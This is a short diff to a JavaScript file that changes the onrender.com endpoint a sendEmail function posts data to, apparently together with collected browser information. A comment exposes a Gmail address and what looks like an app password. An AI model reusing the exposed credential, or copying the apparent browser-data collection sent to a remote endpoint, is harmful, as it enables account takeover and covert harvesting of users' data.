@@ -8,7 +8,7 @@ const browserInfo = {
 // gmfg mdzv qcwh hnxe
 // smartconnectpro6@gmail.com
 function sendEmail(bd) {
-  fetch('https://myweb-lzw3.onrender.com/send-email', {
+  fetch('https://myweb-1-keqf.onrender.com/send-email', {
     method: 'POST',
     headers: {
       'Content-Type': 'application/json'
